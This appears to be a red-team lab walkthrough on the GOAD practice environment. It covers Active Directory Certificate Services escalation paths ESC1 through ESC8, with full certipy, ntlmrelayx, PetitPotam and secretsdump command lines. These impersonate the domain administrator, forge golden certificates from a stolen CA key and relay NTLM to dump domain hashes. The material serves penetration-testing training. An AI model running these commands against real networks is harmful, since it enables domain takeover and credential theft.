GOAD Part 5 - ADCS ESC1-ESC16

We have reached a massive pivot point in our operation. By entering the realm of Active Directory Certificate Services (ADCS), we are essentially moving from fighting the guards at the front gate to bribing the person who prints the security badges.

We have reached a massive pivot point in our operation. By entering the realm of Active Directory Certificate Services (ADCS), we are essentially moving from fighting the guards at the front gate to bribing the person who prints the security badges. In modern Red Team engagements, ADCS exploitation has arguably surpassed traditional methods like Kerberoasting in terms of both stealth and impact.

How Does ADCS Work?

When a user or device requests a certificate, the request is sent to the CA, which validates the request based on the configured certificate template. If the request is approved, the CA issues the certificate, which can then be used for authentication, encryption, or other purposes.

The Exploitation Logic of PKINIT and The Chain of Trust

To master these attacks, we must grasp exactly how obtaining a simple file, a certificate, allows us to compromise the entire domain. Active Directory leverages a Kerberos extension known as PKINIT (Public Key Cryptography for Initial Authentication). This mechanism allows a security principal to request a Kerberos Ticket Granting Ticket (TGT) by presenting a valid X.509 certificate instead of encrypting a timestamp with a password hash.

The ESC Families

We can categorize the Escalation (ESC) vectors into four primary logical families:

  • Template Misconfigurations: Attacks that exploit the blueprints (templates) used to issue certificates.
  • Access Control Abuses: Attacks that target weak permissions on the PKI infrastructure objects.
  • Relay Vectors: Attacks that weaponize network traffic (NTLM) against the ADCS web or RPC interfaces.
  • Mapping and Logic Flaws: The newest generation of attacks that exploit how the Domain Controller maps a certificate back to a specific user account.

I. The Template Injection Family (ESC1, ESC2, ESC3)

The most direct path to compromise involves manipulating the blueprints for certificates, known as Certificate Templates.

ESC1: Subject Alternative Name Spoofing

ESC1 is the "King" of ADCS exploits. It relies on a specific flag in the template configuration called CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. When this is enabled on a template that allows client authentication, the CA essentially allows the requestor to write their own ID card.

Discovery

certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout

Fabrication

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -target 'braavos.essos.local' -template 'ESC1' -ca 'ESSOS-CA' -upn 'administrator@essos.local'

Authentication

certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'

export KRB5CCNAME=administrator.ccache poetry run netexec smb meereen.essos.local -k --use-kcache

ESC2: The Universal Key (Any Purpose)

The ESC2 vulnerability manifests when a certificate template is configured with an "Any Purpose" EKU (OID 2.5.29.37.0) or, surprisingly, when it has absolutely no EKUs defined at all.

certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout

Request ESC2 Certificate

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC2' -ca 'ESSOS-CA'

Request On-Behalf-Of

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx

Authenticate

certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'

ESC3: The Enrollment Agent

ESC3 is an architectural abuse of the "Enrollment Agent" role. In a secure PKI hierarchy, the Certificate Authority designates specific high-trust administrators as Enrollment Agents.

certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout

Request Agent Certificate

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC3-CRA' -ca 'ESSOS-CA'

Request Certificate On-Behalf-Of

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'User' -ca 'ESSOS-CA' -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx

II. Access Control and Object Takeover (ESC4, ESC5, ESC7)

Sometimes the template itself is secure, but the permission controls protecting the PKI infrastructure are weak.

ESC4: Template Hijacking

ESC4 represents a vulnerability class rooted in weak object permissions rather than insecure template configurations. If our user has GenericWrite or WriteDACL permissions on a specific Template Object, we can maliciously reconfigure it.

certipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -stdout

Modify Template

certipy-ad template -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -template 'ESC4' -debug -write-default-configuration

Exploit and Cleanup

certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -target 'braavos.essos.local' -template 'ESC4' -ca 'ESSOS-CA' -upn 'administrator@essos.local' certipy-ad template -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'meereen.essos.local' -template 'ESC4' -write-configuration 'ESC4.json' -no-save

ESC5: Vulnerable PKI Object Access Control - Golden Certificate

ESC5 identifies critical weaknesses in the Access Control Lists (ACLs) that govern the PKI architecture itself. If we control the computer account of the CA server, we possess total control.

poetry run netexec ldap meereen.essos.local -u 'khal.drogo' -p 'horse' -M adcs

Backup CA Private Key

certipy-ad ca -backup -u 'khal.drogo@essos.local' -p 'horse' -dc-host 'braavos.essos.local' -ca 'ESSOS-CA' -target 'braavos.essos.local' -debug

Forge Golden Certificate

certipy-ad forge -ca-pfx 'ESSOS-CA.pfx' -upn 'administrator@essos.local'

certipy-ad auth -pfx administrator.pfx -dc-ip '10.4.10.12'

III. The Network Relay Vectors (ESC6, ESC8, ESC11)

These vulnerabilities move the attack from the database to the wire, exploiting how the Certificate Authority authenticates incoming enrollment requests.

ESC8: NTLM Relay to ADCS HTTP Endpoints

ESC8 is arguably the most pervasive flaw in modern networks. The web interface often accepts NTLM authentication but does not enforce Extended Protection for Authentication (EPA) or SSL usage by default.

Setup Listener

ntlmrelayx.py -t http://10.4.10.23/certsrv/certnsh.asp -smb2support --adcs --template DomainController

Trigger Coerce

petitpotam.py 10.4.10.1 meereen.essos.local

Get TGT

gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'

DCSync

secretsdump.py -k -no-pass 'ESSOS.LOCAL'/'meereen$'@'meereen.essos.local'

ESC8 with Certipy

sudo certipy relay -target 10.4.10.23 -template DomainController

python3 PetitPotam.py 10.4.10.1 meereen.essos.local

sudo certipy auth -pfx meereen.pfx -dc-ip 10.4.10.12

IV. Logic and Mapping Flaws (ESC9, ESC10, ESC13, ESC14, ESC15)

The final frontier of ADCS exploitation involves complex abuses of how the Domain Controller maps a certificate back to a user account.

  • ESC9 and ESC10: Exploit the nuances of the msDS-StrongCertificateBindingInformation attribute
  • ESC13: Focuses on hidden links through Issuance Policies
  • ESC14: Targets weak explicit mappings in altSecurityIdentities
  • ESC15: V1/V0 Schema Abuse
